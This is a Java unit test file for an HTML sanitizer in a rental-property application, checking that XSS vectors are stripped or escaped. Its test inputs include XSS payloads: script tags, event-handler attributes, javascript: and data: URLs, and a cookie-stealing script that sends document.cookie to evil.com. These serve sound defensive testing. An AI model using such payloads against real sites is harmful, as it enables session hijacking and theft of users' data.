package com.affiliate.rentals.gydi.shared.security;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Unit tests for HTMLSanitizer component.
 * Tests all sanitization methods and XSS prevention scenarios.
 */
@DisplayName("HTMLSanitizer Tests")
class HTMLSanitizerTest {

    private HTMLSanitizer sanitizer;

    @BeforeEach
    void setUp() {
        sanitizer = new HTMLSanitizer();
    }

    @Nested
    @DisplayName("sanitizeToPlainText() Tests")
    class SanitizeToPlainTextTests {

        @Test
        @DisplayName("Should strip all HTML tags and return plain text")
        void shouldStripAllHtmlTags() {
            // Given
            String html = "<p>Hello <b>World</b></p>";

            // When
            String result = sanitizer.sanitizeToPlainText(html);

            // Then
            assertThat(result).isEqualTo("Hello World");
        }

        @Test
        @DisplayName("Should remove script tags and prevent XSS")
        void shouldRemoveScriptTags() {
            // Given
            String maliciousHtml = "<p>Hello</p><script>alert('XSS')</script><p>World</p>";

            // When
            String result = sanitizer.sanitizeToPlainText(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("<script>")
                    .doesNotContain("alert")
                    .isEqualTo("HelloWorld");
        }

        @Test
        @DisplayName("Should remove event handlers (XSS vectors)")
        void shouldRemoveEventHandlers() {
            // Given
            String maliciousHtml = "<div onclick='alert(1)'>Click me</div>";

            // When
            String result = sanitizer.sanitizeToPlainText(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("onclick")
                    .doesNotContain("alert")
                    .isEqualTo("Click me");
        }

        @Test
        @DisplayName("Should remove dangerous links (javascript:, data:)")
        void shouldRemoveDangerousLinks() {
            // Given
            String maliciousHtml = "<a href='javascript:alert(1)'>Click</a>";

            // When
            String result = sanitizer.sanitizeToPlainText(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("javascript:")
                    .doesNotContain("href")
                    .isEqualTo("Click");
        }

        @Test
        @DisplayName("Should handle null input safely")
        void shouldHandleNullInput() {
            // When
            String result = sanitizer.sanitizeToPlainText(null);

            // Then
            assertThat(result).isNull();
        }

        @Test
        @DisplayName("Should handle empty input safely")
        void shouldHandleEmptyInput() {
            // When
            String result = sanitizer.sanitizeToPlainText("");

            // Then
            assertThat(result).isEmpty();
        }

        @Test
        @DisplayName("Should handle blank input safely")
        void shouldHandleBlankInput() {
            // When
            String result = sanitizer.sanitizeToPlainText("   ");

            // Then
            assertThat(result).isEqualTo("   ");
        }

        @Test
        @DisplayName("Should preserve plain text without HTML")
        void shouldPreservePlainText() {
            // Given
            String plainText = "This is plain text without any HTML";

            // When
            String result = sanitizer.sanitizeToPlainText(plainText);

            // Then
            assertThat(result).isEqualTo(plainText);
        }

        @Test
        @DisplayName("Should remove iframe tags (XSS vector)")
        void shouldRemoveIframeTags() {
            // Given
            String maliciousHtml = "<p>Content</p><iframe src='evil.com'></iframe>";

            // When
            String result = sanitizer.sanitizeToPlainText(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("iframe")
                    .doesNotContain("evil.com")
                    .isEqualTo("Content");
        }

        @Test
        @DisplayName("Should remove style tags that could be used for phishing")
        void shouldRemoveStyleTags() {
            // Given
            String maliciousHtml = "<style>body{display:none}</style><p>Text</p>";

            // When
            String result = sanitizer.sanitizeToPlainText(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("style")
                    .doesNotContain("display")
                    .isEqualTo("Text");
        }
    }

    @Nested
    @DisplayName("sanitizeBasicFormatting() Tests")
    class SanitizeBasicFormattingTests {

        @Test
        @DisplayName("Should allow basic formatting tags (b, i, em, strong, p)")
        void shouldAllowBasicFormattingTags() {
            // Given
            String html = "<p>Hello <b>bold</b> and <i>italic</i> and <em>emphasis</em> and <strong>strong</strong></p>";

            // When
            String result = sanitizer.sanitizeBasicFormatting(html);

            // Then
            assertThat(result)
                    .contains("<p>")
                    .contains("<b>")
                    .contains("<i>")
                    .contains("<em>")
                    .contains("<strong>");
        }

        @Test
        @DisplayName("Should allow lists (ul, ol, li)")
        void shouldAllowLists() {
            // Given
            String html = "<ul><li>Item 1</li><li>Item 2</li></ul>";

            // When
            String result = sanitizer.sanitizeBasicFormatting(html);

            // Then
            assertThat(result)
                    .contains("<ul>")
                    .contains("<li>")
                    .contains("Item 1");
        }

        @Test
        @DisplayName("Should remove script tags")
        void shouldRemoveScriptTags() {
            // Given
            String maliciousHtml = "<p>Safe content</p><script>alert('XSS')</script>";

            // When
            String result = sanitizer.sanitizeBasicFormatting(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("<script>")
                    .doesNotContain("alert")
                    .contains("<p>Safe content</p>");
        }

        @Test
        @DisplayName("Should remove links (not allowed in basic formatting)")
        void shouldRemoveLinks() {
            // Given
            String html = "<p>Text with <a href='http://example.com'>link</a></p>";

            // When
            String result = sanitizer.sanitizeBasicFormatting(html);

            // Then
            assertThat(result)
                    .doesNotContain("<a")
                    .doesNotContain("href")
                    .contains("link"); // Text preserved
        }

        @Test
        @DisplayName("Should remove event handlers")
        void shouldRemoveEventHandlers() {
            // Given
            String maliciousHtml = "<p onclick='alert(1)'>Click me</p>";

            // When
            String result = sanitizer.sanitizeBasicFormatting(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("onclick")
                    .contains("<p>Click me</p>");
        }

        @Test
        @DisplayName("Should handle null input safely")
        void shouldHandleNullInput() {
            // When
            String result = sanitizer.sanitizeBasicFormatting(null);

            // Then
            assertThat(result).isNull();
        }
    }

    @Nested
    @DisplayName("sanitizeRichText() Tests")
    class SanitizeRichTextTests {

        @Test
        @DisplayName("Should allow safe links with http/https")
        void shouldAllowSafeLinks() {
            // Given
            String html = "<p>Visit <a href='https://example.com'>Example</a></p>";

            // When
            String result = sanitizer.sanitizeRichText(html);

            // Then
            assertThat(result)
                    .contains("<a href=\"https://example.com\"")
                    .contains("Example");
        }

        @Test
        @DisplayName("Should add rel='nofollow' to links for SEO protection")
        void shouldAddNoFollowToLinks() {
            // Given
            String html = "<a href='https://example.com'>Link</a>";

            // When
            String result = sanitizer.sanitizeRichText(html);

            // Then
            assertThat(result).contains("rel=\"nofollow\"");
        }

        @Test
        @DisplayName("Should remove javascript: URLs")
        void shouldRemoveJavaScriptUrls() {
            // Given
            String maliciousHtml = "<a href='javascript:alert(1)'>Click</a>";

            // When
            String result = sanitizer.sanitizeRichText(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("javascript:")
                    .doesNotContain("alert");
        }

        @Test
        @DisplayName("Should remove data: URLs")
        void shouldRemoveDataUrls() {
            // Given
            String maliciousHtml = "<a href='data:text/html,<script>alert(1)</script>'>Click</a>";

            // When
            String result = sanitizer.sanitizeRichText(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("data:")
                    .doesNotContain("script");
        }

        @Test
        @DisplayName("Should allow mailto: links")
        void shouldAllowMailtoLinks() {
            // Given
            String html = "<a href='mailto:test@example.com'>Email</a>";

            // When
            String result = sanitizer.sanitizeRichText(html);

            // Then - @ is HTML-encoded to &#64; which is correct
            assertThat(result)
                    .contains("mailto:")
                    .contains("example.com")
                    .contains("Email");
        }

        @Test
        @DisplayName("Should allow blockquotes")
        void shouldAllowBlockquotes() {
            // Given
            String html = "<blockquote>This is a quote</blockquote>";

            // When
            String result = sanitizer.sanitizeRichText(html);

            // Then
            assertThat(result)
                    .contains("<blockquote>")
                    .contains("This is a quote");
        }

        @Test
        @DisplayName("Should remove script tags even in rich text")
        void shouldRemoveScriptTags() {
            // Given
            String maliciousHtml = "<p>Safe</p><script>alert('XSS')</script>";

            // When
            String result = sanitizer.sanitizeRichText(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("<script>")
                    .doesNotContain("alert")
                    .contains("<p>Safe</p>");
        }

        @Test
        @DisplayName("Should remove event handlers from links")
        void shouldRemoveEventHandlersFromLinks() {
            // Given
            String maliciousHtml = "<a href='https://example.com' onclick='alert(1)'>Click</a>";

            // When
            String result = sanitizer.sanitizeRichText(maliciousHtml);

            // Then
            assertThat(result)
                    .doesNotContain("onclick")
                    .contains("href=\"https://example.com\"");
        }

        @Test
        @DisplayName("Should handle null input safely")
        void shouldHandleNullInput() {
            // When
            String result = sanitizer.sanitizeRichText(null);

            // Then
            assertThat(result).isNull();
        }
    }

    @Nested
    @DisplayName("containsUnsafeHTML() Tests")
    class ContainsUnsafeHtmlTests {

        @Test
        @DisplayName("Should return true for HTML with script tags")
        void shouldDetectScriptTags() {
            // Given
            String maliciousHtml = "<p>Text</p><script>alert('XSS')</script>";

            // When
            boolean result = sanitizer.containsUnsafeHTML(maliciousHtml);

            // Then
            assertThat(result).isTrue();
        }

        @Test
        @DisplayName("Should return true for HTML with any tags")
        void shouldDetectAnyHtmlTags() {
            // Given
            String html = "<p>Text</p>";

            // When
            boolean result = sanitizer.containsUnsafeHTML(html);

            // Then
            assertThat(result).isTrue();
        }

        @Test
        @DisplayName("Should return false for plain text")
        void shouldNotDetectPlainText() {
            // Given
            String plainText = "This is just plain text";

            // When
            boolean result = sanitizer.containsUnsafeHTML(plainText);

            // Then
            assertThat(result).isFalse();
        }

        @Test
        @DisplayName("Should return false for null input")
        void shouldHandleNullInput() {
            // When
            boolean result = sanitizer.containsUnsafeHTML(null);

            // Then
            assertThat(result).isFalse();
        }

        @Test
        @DisplayName("Should return false for empty input")
        void shouldHandleEmptyInput() {
            // When
            boolean result = sanitizer.containsUnsafeHTML("");

            // Then
            assertThat(result).isFalse();
        }
    }

    @Nested
    @DisplayName("escapeHTML() Tests")
    class EscapeHtmlTests {

        @Test
        @DisplayName("Should escape < to &lt;")
        void shouldEscapeLessThan() {
            // Given
            String html = "a < b";

            // When
            String result = sanitizer.escapeHTML(html);

            // Then
            assertThat(result).isEqualTo("a &lt; b");
        }

        @Test
        @DisplayName("Should escape > to &gt;")
        void shouldEscapeGreaterThan() {
            // Given
            String html = "a > b";

            // When
            String result = sanitizer.escapeHTML(html);

            // Then
            assertThat(result).isEqualTo("a &gt; b");
        }

        @Test
        @DisplayName("Should escape & to &amp;")
        void shouldEscapeAmpersand() {
            // Given
            String html = "Tom & Jerry";

            // When
            String result = sanitizer.escapeHTML(html);

            // Then
            assertThat(result).isEqualTo("Tom &amp; Jerry");
        }

        @Test
        @DisplayName("Should escape double quotes to &quot;")
        void shouldEscapeDoubleQuotes() {
            // Given
            String html = "He said \"Hello\"";

            // When
            String result = sanitizer.escapeHTML(html);

            // Then
            assertThat(result).isEqualTo("He said &quot;Hello&quot;");
        }

        @Test
        @DisplayName("Should escape single quotes to &#x27;")
        void shouldEscapeSingleQuotes() {
            // Given
            String html = "It's mine";

            // When
            String result = sanitizer.escapeHTML(html);

            // Then
            assertThat(result).isEqualTo("It&#x27;s mine");
        }

        @Test
        @DisplayName("Should escape all special characters together")
        void shouldEscapeAllSpecialCharacters() {
            // Given
            String html = "<script>alert('XSS & \"injection\"')</script>";

            // When
            String result = sanitizer.escapeHTML(html);

            // Then
            assertThat(result).isEqualTo("&lt;script&gt;alert(&#x27;XSS &amp; &quot;injection&quot;&#x27;)&lt;/script&gt;");
        }

        @Test
        @DisplayName("Should preserve text without special characters")
        void shouldPreserveNormalText() {
            // Given
            String text = "This is normal text";

            // When
            String result = sanitizer.escapeHTML(text);

            // Then
            assertThat(result).isEqualTo(text);
        }

        @Test
        @DisplayName("Should handle null input safely")
        void shouldHandleNullInput() {
            // When
            String result = sanitizer.escapeHTML(null);

            // Then
            assertThat(result).isNull();
        }

        @Test
        @DisplayName("Should handle empty input safely")
        void shouldHandleEmptyInput() {
            // When
            String result = sanitizer.escapeHTML("");

            // Then
            assertThat(result).isEmpty();
        }
    }

    @Nested
    @DisplayName("Real-World XSS Attack Scenarios")
    class RealWorldXssTests {

        @Test
        @DisplayName("Should block reflected XSS via script tag")
        void shouldBlockReflectedXss() {
            // Given - Common reflected XSS attack
            String maliciousInput = "<script>document.cookie</script>";

            // When
            String result = sanitizer.sanitizeToPlainText(maliciousInput);

            // Then
            assertThat(result)
                    .doesNotContain("<script>")
                    .doesNotContain("document.cookie");
        }

        @Test
        @DisplayName("Should block XSS via img onerror")
        void shouldBlockImgOnerrorXss() {
            // Given - Image onerror XSS
            String maliciousInput = "<img src=x onerror='alert(1)'>";

            // When
            String result = sanitizer.sanitizeToPlainText(maliciousInput);

            // Then
            assertThat(result)
                    .doesNotContain("onerror")
                    .doesNotContain("alert");
        }

        @Test
        @DisplayName("Should block XSS via svg onload")
        void shouldBlockSvgOnloadXss() {
            // Given - SVG onload XSS
            String maliciousInput = "<svg onload='alert(1)'>";

            // When
            String result = sanitizer.sanitizeToPlainText(maliciousInput);

            // Then
            assertThat(result)
                    .doesNotContain("onload")
                    .doesNotContain("alert");
        }

        @Test
        @DisplayName("Should sanitize property description with malicious code")
        void shouldSanitizePropertyDescription() {
            // Given - Realistic property description with injected XSS
            String maliciousDescription = "Beautiful apartment <script>fetch('evil.com/steal?cookie='+document.cookie)</script> with ocean view";

            // When
            String result = sanitizer.sanitizeToPlainText(maliciousDescription);

            // Then
            assertThat(result)
                    .contains("Beautiful apartment")
                    .contains("with ocean view")
                    .doesNotContain("<script>")
                    .doesNotContain("fetch")
                    .doesNotContain("evil.com");
        }

        @Test
        @DisplayName("Should sanitize user bio with event handlers")
        void shouldSanitizeUserBio() {
            // Given - User bio with XSS attempt
            String maliciousBio = "I'm a developer <div onmouseover='alert(1)'>hover here</div>";

            // When
            String result = sanitizer.sanitizeToPlainText(maliciousBio);

            // Then - apostrophe may be HTML-encoded to &#39; which is correct
            assertThat(result)
                    .contains("a developer")
                    .contains("hover here")
                    .doesNotContain("onmouseover")
                    .doesNotContain("alert")
                    .doesNotContain("<div>");
        }
    }
}